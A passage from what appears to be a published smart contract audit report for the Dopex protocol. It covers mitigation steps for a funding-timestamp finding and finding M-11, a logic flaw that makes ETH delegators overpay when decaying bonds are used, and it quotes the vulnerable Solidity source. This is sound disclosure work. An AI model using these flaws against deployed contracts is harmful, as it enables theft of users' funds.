class=\"mtk7\">+  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   function testMockups() external {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     deposit(1 ether, address(this));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     assertEq(vaultLp.totalCollateral(), 1 ether);</span></span></span></code></pre>\n</details>\n<h3 id=\"recommended-mitigation-steps-17\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-17\" aria-label=\"recommended mitigation steps 17 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Option 1 - Complete Fix:\nReconsider if it is really necessary for the protocol to change the funding duration throughout its lifecycle. If no, declare the <code>fundingDuration</code> as <code>immutable</code>.</p>\n<p>Option 2 - Mitigation:\nStore the <code>lastFundingPaymentTimestamp</code> and incease it by <code>fundingDuration</code> in <code>updateFundingPaymentPointer()</code> on each new epoch to accomplish the expected timing behaviour.<br>\nNote that the scaling issue does not only appear in <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L562-L569\">PerpetualAtlanticVault.nextFundingPaymentTimestamp()</a>, but also in <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L426-L427\">L426-427</a>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/850#issuecomment-1772543256\">Alex the Entreprenerd (Judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>Good discussion of consequences + POC.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/980\">witherblock (Dopex) confirmed via duplicate issue 980</a></strong></p>\n<hr>\n<h2 id=\"m-11-user-that-delegate-eth-to-rdpxv2core-will-incur-loss-if-his-delegated-eth-fulfilled-by-decaying-bonds\" style=\"position:relative;\"><a href=\"#m-11-user-that-delegate-eth-to-rdpxv2core-will-incur-loss-if-his-delegated-eth-fulfilled-by-decaying-bonds\" aria-label=\"m 11 user that delegate eth to rdpxv2core will incur loss if his delegated eth fulfilled by decaying bonds permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/780\">[M-11] User that delegate eth to <code>RdpxV2Core</code> will incur loss if his delegated eth fulfilled by decaying bonds</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/780\">said</a>, also found by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2187\">peakbolt</a> and <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/303\">HChang26</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L843-L847\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L843-L847</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L699-L744\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L699-L744</a></p>\n<p>Current design allow user call <code>bondWithDelegate</code> using decaying bonds, this will make delegatee incur loss because they will get less bond and paid more eth.</p>\n<h3 id=\"proof-of-concept-17\" style=\"position:relative;\"><a href=\"#proof-of-concept-17\" aria-label=\"proof of concept 17 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>When users have decaying bonds, they can either utilize it via <code>bond</code> or <code>bondWithDelegate</code>. If user choose to use <code>bondWithDelegate</code>, they need to provide <code>_delegateIds</code> (delegated eth that can fulfill the request).</p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L819-L885\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L819-L885</a></p>\n<details>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"62\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">bondWithDelegate</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amounts</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_delegateIds</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rdpxBondId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receiptTokenAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_whenNotPaused</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Validate amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_validate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amounts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">_delegateIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">, </span><span class=\"mtk7\">3</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">userTotalBondAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalBondAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">delegateReceiptTokenAmounts</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[](</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">_amounts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">_amounts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Validate amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">_validate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amounts</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">] &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">4</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">BondWithDelegateReturnValue</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">returnValues</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">BondWithDelegateReturnValue</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;&gt;   </span><span class=\"mtk12\">returnValues</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_bondWithDelegate</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_amounts</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">rdpxBondId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_delegateIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">delegateReceiptTokenAmounts</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">returnValues</span><span class=\"mtk1\">.</span><span class=\"mtk12\">delegateReceiptTokenAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">userTotalBondAmount</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">returnValues</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bondAmountForUser</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">totalBondAmount</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">_amounts</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// purchase options</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">premium</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">putOptionsRequired</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">premium</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_purchaseOptions</span><span class=\"mtk1\">(</span><span class=\"mtk12\">returnValues</span><span class=\"mtk1\">.</span><span class=\"mtk12\">rdpxRequired</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// transfer the required rdpx</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">_transfer</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">returnValues</span><span class=\"mtk1\">.</span><span class=\"mtk12\">rdpxRequired</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">returnValues</span><span class=\"mtk1\">.</span><span class=\"mtk12\">wethRequired</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">premium</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_amounts</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">rdpxBondId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk3\">// ....</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n</details>\n<p>Then it will call <code>_bondWithDelegate</code> to calculate <code>rdpxRequired</code> and <code>wethRequired</code> and reduce delegatee provided collateral by increasing <code>activeCollateral</code> with  <code>wethRequired</code>. Then calculate the bond received by calling <code>_calculateAmounts</code>, this will based on <code>delegate.fee</code>, <code>wethRequired</code> and <code>rdpxRequired</code>.</p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L699-L744\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L699-L744</a></p>\n<details>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"63\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_bondWithDelegate</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rdpxBondId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">delegateId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">BondWithDelegateReturnValue</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">returnValues</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Compute the bond cost</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;&gt; (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rdpxRequired</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wethRequired</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">calculateBondCost</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">rdpxBondId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// update ETH token reserve</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">reserveAsset</span><span class=\"mtk1\">[</span><span class=\"mtk12\">reservesIndex</span><span class=\"mtk1\">[</span><span class=\"mtk8\">&quot;WETH&quot;</span><span class=\"mtk1\">]].</span><span class=\"mtk12\">tokenBalance</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">wethRequired</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">Delegate</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">delegate</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">delegates</span><span class=\"mtk1\">[</span><span class=\"mtk12\">delegateId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// update delegate active collateral</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_validate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">delegate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">delegate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">activeCollateral</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">wethRequired</span><span class=\"mtk1\">, </span><span class=\"mtk7\">5</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">delegate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">activeCollateral</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">wethRequired</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// update total weth delegated</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">totalWethDelegated</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">wethRequired</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Calculate the amount of bond token to mint for the delegate and user based on the fee</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;&gt; (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount2</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">_calculateAmounts</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">wethRequired</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">rdpxRequired</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">delegate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">fee</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// update user amounts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// ETH token amount remaining after LP for the user</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bondAmountForUser</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">amount1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Mint bond token for delegate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// ETH token amount remaining after LP for the delegate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">delegateReceiptTokenAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_stake</span><span class=\"mtk1\">(</span><span class=\"mtk12\">delegate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">returnValues</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">BondWithDelegateReturnValue</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">delegateReceiptTokenAmount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">bondAmountForUser</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">rdpxRequired</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">wethRequired</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n</details>\n<p>If user using decaying bonds, when call <code>calculateBondCost</code> and calculating <code>rdpxRequired</code> and <code>wethRequired</code>, it will not use any discount, this will make <code>wethRequired</code> even more bigger considering that if <code>putOptionsRequired</code> is <code>true</code>. delegatee need to paid premium that based on <code>rdpxRequired</code> (that not discounted).</p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L1156-L1199\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L1156-L1199</a></p>\n<details>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"64\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">calculateBondCost</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_rdpxBondId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rdpxRequired</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wethRequired</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rdpxPrice</span><span class=\"mtk1\"> = </span><span 